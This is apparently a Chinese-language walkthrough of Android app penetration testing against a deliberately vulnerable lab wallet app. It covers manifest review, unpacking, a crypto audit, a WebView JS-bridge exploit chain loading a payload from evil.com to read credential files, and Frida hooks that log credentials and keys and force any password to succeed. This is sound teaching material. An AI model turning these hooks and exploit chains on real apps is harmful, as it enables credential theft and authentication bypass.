🪪 文件指纹 Fingerprint ① 侦察

不装、不改、不运行。先给文件验明正身：算哈希锁定样本、读 ZIP 结构、提取签名者信息，判断是否被二次打包过。
📥 输入
demo-wallet.apk
📤 输出
SHA-256 / 打包特征 / 签名主体
⬇️ 只读不跑 · 提取元数据 ⬇️
终端 $ file demo-wallet.apk demo-wallet.apk: Zip archive data, v2.0 $ shasum -a 256 demo-wallet.apk a3f1c9e2...b71d ← 样本唯一身份证 $ unzip -l demo-wallet.apk | head -6 classes.dex 2,148,332 resources.arsc 892,104 lib/arm64-v8a/libnative-lib.so $ apksigner verify --print-certs demo-wallet.apk Signer #1: CN=Demo Wallet, O=VulnLab
SHA-256 是样本的全球唯一标识，用于情报比对 签名是 v1 还是 v2/v3，决定后面重打包的绕过难度

清单解剖

🗺️ 清单解剖 Manifest Teardown ① 侦察

AndroidManifest.xml 就是攻击地图。重点找四样东西：exported 组件（谁能从外部喊它）、危险权限、scheme 深链、allowBackup / cleartextTraffic。
📥 输入
二进制 AXML
📤 输出
攻击入口清单 / 权限面 / 深链路径
⬇️ AXML 解码 · 提取攻击面 ⬇️
AndroidManifest.xml <manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.vuln.wallet" android:versionName="2.3.1"> <uses-permission android:name="android.permission.READ_SMS"/> <application android:allowBackup="true" ← adb backup 拖数据 android:usesCleartextTraffic="true"> ← 允许明文 HTTP <activity android:name=".ui.WebActivity" android:exported="true"> ← 对外裸奔 <intent-filter> <action android:name="android.intent.action.VIEW"/> <category android:name="android.intent.category.BROWSABLE"/> <category android:name="android.intent.category.DEFAULT"/> <data android:scheme="vulnwallet"/> </intent-filter> </activity> </application> </manifest>
exported=true 且无 permission 保护 = 任意 App 可调用 allowBackup=true → adb backup 直接拖走私有数据 深链 scheme 可被任意网页/短信唤起 → 钓鱼入口

🛡️ 加固检测 Packer Detection ① 侦察

判断有没有壳，直接决定后续路线：无壳 → 直接反编译；有壳 → 走运行时脱壳。硬刚加固壳的静态分析 = 纯浪费时间。
📥 输入
lib/ 目录 + Application 类名
📤 输出

⬇️ 比对本样本的 lib/ 目录 ⬇️

脱壳

🔓 脱壳 Dump Dex Unpacking ② 反编译

加了壳的 APK，zip 里的类只是加载器，真正的 dex 在运行时才解密进内存。要拿真身，就得在它跑起来的那一刻动手。
📥 输入
运行中的加固 App
📤 输出
解密后的真实 classes.dex
⬇️ 运行时拦截 DexFile 加载 ⬇️
hook_dexdump.js Java.perform(function () { var DexFile = Java.use("dalvik.system.DexFile"); var origInit = DexFile.$init.overload('java.lang.String'); // ① 先保存原方法 origInit.implementation = function (path) { var ret = origInit.call(this, path); // ② 调原方法，不会递归 console.log("[+] DexFile loaded: " + path); dumpDexFromMemory(path); // 从内存抠出明文 dex return ret; }; }); // $ frida -U -f com.vuln.wallet -l hook_dexdump.js
主流工具：frida-dexdump / FART / youpk / BlackDex 抽取壳需主动调用触发方法，否则 dump 出来的 dex 指令是空的 本样本无壳，此步可跳过 —— 但真实对抗中这是最耗时的一环

加密审计

🔐 加解密审计 Crypto Audit ③ 审计

加密实现错了，比不加密更危险——因为它给人虚假的安全感。ECB 模式、固定 IV、弱随机数是三大经典死穴。
📥 输入
CryptoUtil / 所有 Cipher 调用
📤 输出
算法缺陷清单 + 可预测性证明
⬇️ 逐行检查 Cipher 调用 ⬇️
CryptoUtil.java Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding"); ← ECB 模式 c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(AES_KEY.getBytes(), "AES")); // 无 IV，无加盐，无 HMAC —— 密文可被篡改而不被发现 byte[] out = c.doFinal(plain.getBytes()); // 还发现： new Random().nextInt() ← 应为 SecureRandom，可预测
ECB 相同明文 → 相同密文，可直接做字典比对攻击 缺 HMAC = 可做 padding oracle / 密文篡改

🌉 WebView 与 JS 桥 WebView Audit ③ 审计

WebView 是从 Web 层打进系统层的桥。一旦 JS 接口暴露了敏感能力，配合 3b 的任意 URL 加载，就是一个完整的 RCE 利用链。
📥 输入
WebView 配置 + JavascriptInterface
📤 输出

① 审计发现：危险 JS 桥 webView.getSettings().setJavaScriptEnabled(true); webView.addJavascriptInterface(new JsBridge(), "bridge"); class JsBridge { @JavascriptInterface public String exec(String cmd) { return Shell.run(cmd); ← 直接 RCE } @JavascriptInterface public String getToken() { return user.getToken(); } ← 窃取凭据 }
⬇️ 配合 3b 的任意 URL 加载，注入 JS 载荷 ⬇️
② 完整利用链 // 唤起：vulnwallet://web?url=http://evil.com/p.html <script> bridge.exec("cat /data/data/com.vuln.wallet/shared_prefs/user.xml") </script> → 从 Web 层直达系统层，一键 getshell

关键 Hook

🪝 关键函数 Hook Runtime Hooking ④ 动态

在运行时改写方法实现：想看什么就打印什么，想通过什么就返回什么。客户端的一切校验，都只是一行 return 的距离。
📥 输入
App 进程 + frida 脚本
📤 输出
明文凭据 / 密钥 / 业务参数
⬇️ 改写方法实现，劫持返回值 ⬇️
hook.js Java.perform(function () { // 1. 抓明文凭据 + 直接登录成功 var Login = Java.use("com.vuln.wallet.ui.LoginActivity"); Login.checkPassword.implementation = function (u, p) { console.log("[+] 凭据: " + u + " / " + p); return true; // ← 任意密码登录成功 }; // 2. 直接打印密钥 var Crypto = Java.use("com.vuln.wallet.util.CryptoUtil"); var origGetKey = Crypto.getKey; // ① 先保存原方法 Crypto.getKey.implementation = function () { var k = origGetKey.call(this); // ② 调原方法，不会递归 console.log("[+] AES Key = " + k); return k; }; });
客户端校验全是纸糊的 —— 真正的安全边界只能在服务端 hook 输入参数能拿到明文，hook 返回值能绕过校验，两边都别放过
